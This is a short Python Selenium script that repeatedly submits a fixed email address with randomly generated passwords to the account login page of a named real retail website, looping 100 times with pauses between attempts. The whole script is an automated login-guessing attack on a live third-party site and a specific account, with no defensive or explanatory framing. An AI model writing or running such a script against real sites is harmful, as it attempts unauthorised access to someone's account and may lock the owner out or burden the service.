from selenium import webdriver
import os
import random
import time
PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chromedriver.exe")
email = "7fa5ddd871@emailnax.com"
def id_generator(Largo=12, chars="!#$%&Ññ'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~" ):
    return ''.join(random.choice(chars) for _ in range(Largo))



CHROME_BROWSER = webdriver.Chrome(PATH)
CHROME_BROWSER.get("https://prophonechile.cl/mi-cuenta/")
for i in range(0,100):
    time.sleep(15)
    print("Iteración N°:",i)
    CHROME_BROWSER.find_element_by_id("username").clear()
    CHROME_BROWSER.find_element_by_id("username").send_keys(email)
    CHROME_BROWSER.find_element_by_id("password").send_keys(id_generator())
    CHROME_BROWSER.find_element_by_name("login").click()  
    

